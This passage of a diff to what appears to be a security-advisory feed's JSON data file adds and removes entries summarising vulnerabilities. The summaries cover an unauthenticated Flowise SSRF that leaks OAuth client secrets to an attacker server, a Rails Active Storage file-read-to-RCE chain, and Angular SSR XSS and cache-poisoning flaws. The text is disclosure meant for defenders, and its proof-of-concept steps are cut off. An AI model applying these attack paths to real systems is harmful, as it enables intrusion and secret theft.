reproduction steps:\n\n1. Log in as a user who can create API keys, and create a key with only an unrelated permission, for example:\n\n```bash\ncurl -i -b tamako.cookie \\\n  -H 'x-request-from: internal' \\\n  -H 'Content-Type: application/json",
+      "link": "https://github.com/advisories/GHSA-wp74-f5hh-5f3r",
+      "published": "2026-08-04T14:54:03Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69252"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69250",
+      "title": "Flowise: Unauthenticated OAuth2 Refresh Enables Non-Blind SSRF and Secret Exfiltration",
+      "summary": "### Summary\n\nThe OAuth2 token refresh endpoint (`POST /api/v1/oauth2-credential/refresh/:credentialId`) is unauthenticated by design (it is in the public whitelist) and performs a server-side HTTP request to a credential-controlled URL (`accessTokenUrl`) without SSRF protections. In runtime validation, this endpoint was reachable without auth, triggered outbound POST requests to an attacker-controlled server, and reflected the full remote response body to the caller (`tokenInfo`), confirming non-blind SSRF and credential secret exfiltration.\n\n### Details\n\nThe vulnerability is in `dist/routes/oauth2/index.js` (container runtime build), under path prefix `/api/v1/oauth2-credential`.\n\nConfirmed in runtime code:\n\n1. **Unauthenticated route via whitelist**\n   - `dist/utils/constants.js` includes:\n     - `/api/v1/oauth2-credential/callback`\n     - `/api/v1/oauth2-credential/refresh`\n   - `dist/index.js` auth middleware uses:\n     - `const isWhitelisted = whitelistURLs.some((url) => req.path.startsWith(url))`\n   - Therefore `/api/v1/oauth2-credential/refresh/:credentialId` is treated as whitelisted.\n\n2. **User-controlled SSRF target**\n   - In refresh handler (`dist/routes/oauth2/index.js`):\n     - loads credential by `credentialId`\n     - decrypts credential data\n     - reads `accessTokenUrl`\n     - executes:\n       - `axios.post(tokenUrl, new URLSearchParams(refreshRequestData).toString(), ...)`\n   - No `secureAxiosRequest()` / denylist wrapper is used in this path.\n\n3. **Non-blind response reflection**\n   - Response returns:\n     - `tokenInfo: { ...tokenData, ... }`\n   - `tokenData` is the attacker/internal server response body.\n\n4. **Secrets sent to SSRF target**\n   - Request body includes:\n     - `client_id`\n     - `client_secret`\n     - `grant_type=refresh_token`\n     - `refresh_token`\n\n### PoC\n\n#### Environment used\n\n- `flowiseai/flowise:latest` container (`localhost:3000`)\n- Attacker server (`localhost:18081`) returning JSON\n\n#### Step 1: Start attacker server\n\n```b",
+      "link": "https://github.com/advisories/GHSA-r745-8hwv-h473",
+      "published": "2026-08-04T14:20:49Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69250"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
       "id": "https://thehackernews.com/2026/08/new-cpanel-critical-flaw-could-let.html",
       "title": "New cPanel Critical Flaw Could Let Hosting Customers Run SQL as Database Root",
       "summary": "cPanel has patched a flaw that let an authenticated hosting customer execute SQL in the database's root context, crossing the privilege boundary between a cPanel account and the server's administrative database identity. It shipped in a targeted security release that closes two other routes past account boundaries.\n\nThe database bug is tracked as CVE-2026-58048 (CVSS 4.0 score: 9.4) and affects",
@@ -337,59 +610,6 @@
       ],
       "cve_ids": [
         "CVE-2026-18446"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.rapid7.com/blog/post/ra-kindarails2shell-technical-analysis-cve-2026-66066",
-      "title": "Rapid7 Analysis: KindaRails2Shell (CVE-2026-66066)",
-      "summary": "Overview On July 29, 2026, the Ruby on Rails project published a security advisory for CVE-2026-66066 , an arbitrary file read in Active Storage applications that use the Vips image processor with untrusted uploads. The affected Active Storage ranges are < 7.2.3.2 , >= 8.0, < 8.0.5.1 , and >= 8.1, < 8.1.3.1 . Vips is the default Active Storage variant processor for applications that load Rails 7.0 or later defaults. Rails 6 applications are affected only when they explicitly configure Vips. Our Emergent Threat Response blog covers the affected versions, mitigation guidance, and current exploitation status. This post traces the request from the direct-upload endpoint to the HDF5 read, then shows how the arbitrary file read can expose Rails signing material and become code execution. A vulnerable application can disclose arbitrary files before the attacker has recovered a Rails secret or forged a token. A genuine Active Storage variation_key from the same application, paired with a direct-upload blob whose stored content_type claims to be an image, is enough to reach a libvips loader that turns a crafted MAT/HDF5 file into an arbitrary file-read oracle. We reproduced the published chain against Rails 6.0.6.1 , 6.1.7.10 , 7.2.3.1 , 8.0.5 , and 8.1.3 , and confirmed that patched 7.2.3.2 , 8.0.5.1 , and 8.1.3.1 targets block the crafted representation. We also validated a remote code execution (RCE) path that uses only JSON-compatible Hash , Array , and String values in a signed variation. That path reaches Kernel#spawn or Kernel#eval through ImageProcessing's chain builder, and it worked when Rails was configured with config.active_support.message_serializer = :json . The advisory covers the vulnerable Active Storage configuration. The MAT/HDF5 representation chain shown here has narrower requirements. The deployed libvips build must expose matload with MAT 7.3/HDF5 support, the application must preserve an attacker-supplied content_type , and the attacker must be able ",
-      "link": "https://www.rapid7.com/blog/post/ra-kindarails2shell-technical-analysis-cve-2026-66066",
-      "published": "2026-08-03T17:11:25+00:00",
-      "source": "Rapid7 Blog",
-      "tags": [
-        "research",
-        "metasploit"
-      ],
-      "cve_ids": [
-        "CVE-2026-66066"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-69149",
-      "title": "Angular SSR: Missing Fallback Raw-Content Serialization Escaping leads to Cross-Site Scripting (XSS)",
-      "summary": "A Cross-Site Scripting (XSS) vulnerability exists in `@angular/platform-server`'s DOM emulation dependency (`domino`) when serializing the content of fallback raw-content elements (`<iframe>`, `<noembed>`, `<noframes>`, and `<noscript>`).\n\nWhen rendering dynamic text content inside fallback raw-content elements via template bindings, the template engine expects the browser to render the content safely. Under Server-Side Rendering (SSR), `domino` is configured with scripting enabled, meaning these elements are treated as raw-text elements.\n\nHowever, `domino`'s serializer previously did not escape text nodes within fallback raw-content elements (`<iframe>`, `<noembed>`, `<noframes>`, `<noscript>`) during DOM serialization. As a result, any occurrence of closing tags in the bound dynamic text was not escaped.\n\nThe unescaped closing tag could be serialized directly into the output HTML. When parsed by a browser or re-parsed during SSR post-processing without preserving raw-content parser state, an injected closing tag closes the element early, allowing an injected script block to execute in the user's browser context, causing same-origin Cross-Site Scripting (XSS).\n\n### Impact\n\nThis vulnerability allows an attacker to perform same-origin Cross-Site Scripting (XSS) attacks against any user visiting an SSR-rendered page that binds user-controlled data inside fallback raw-content elements (`<iframe>`, `<noembed>`, `<noframes>`, `<noscript>`). This can lead to session hijacking, credentials theft, unauthorized actions on behalf of users, and defacement.\n\n### Patched Versions\n\n- 22.0.7\n- 21.2.19\n- 20.3.27\n\n### Workarounds\nIf you cannot immediately update your dependencies, you can mitigate this issue using any of the following approaches:\n- **Disable critical CSS inlining**: Critical CSS inlining in Angular SSR post-processes the rendered HTML using `domino`. Disabling this step prevents `domino` from re-parsing and re-serializing the HTML during server-side rendering.\n  - I",
-      "link": "https://github.com/advisories/GHSA-vpx6-8pjr-4g3v",
-      "published": "2026-08-03T16:14:43Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-69149"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-68945",
-      "title": "Angular: Cache-Key Ambiguity in HttpTransferCache Leading to Cross-Request Response Reuse and State Poisoning",
-      "summary": "Angular's `HttpTransferCache` caches HTTP requests made during Server-Side Rendering (SSR) so that they can be reused during client-side hydration.\n\nDuring SSR, `HttpTransferCache` previously generated identical key material for distinct request parameters when repeated values were present because repeated values were joined with commas:\n\n```ts\nnew HttpParams().set('role', 'user,admin')\nnew HttpParams().append('role', 'user').append('role', 'admin')\n```\n\nBoth requests previously serialized as `role=user,admin`, allowing distinct `HttpClient` requests to produce the same transfer-cache key material.\n\n### Impact\n\nIn an SSR application, this cache-key ambiguity can make a later security-sensitive `HttpClient` request receive the response from an earlier semantically different request in the same render. For example, an attacker-influenced scalar-comma request can be cached and then replayed as the response for a trusted repeated-param authorization or data request to the same URL. As a result, Angular's server-rendered output can be based on the wrong backend response because the trusted request is not dispatched. This can lead to:\n\n- **State Poisoning**: Using incorrect or attacker-influenced cached responses for subsequent application logic.\n- **Cross-Request Response Reuse**: Reusing cached responses across requests with semantically different parameters.\n\n### Patched Versions\n\n- 22.0.2\n- 21.2.19\n- 20.3.27\n\n### Workarounds\n\nIf you cannot upgrade immediately, configure your `HttpClient` requests to skip transfer caching for sensitive endpoints where repeated parameter keys are used:\n\n```ts\nthis.http.get('/api/resource', {\n  transferCache: false\n});\n```\n\nAlternatively, disable the HTTP transfer cache globally in your application bootstrap config:\n\n```ts\nimport { provideClientHydration, withNoHttpTransferCache } from '@angular/platform-browser';\n\nexport const appConfig = {\n  providers: [\n    provideClientHydration(\n      withNoHttpTransferCache()\n    )\n  ]\n};\n```",
-      "link": "https://github.com/advisories/GHSA-jhpw-976m-542j",
-      "published": "2026-08-03T15:59:13Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-68945"
       ],
       "is_zero_day": false,
       "is_high_severity": true
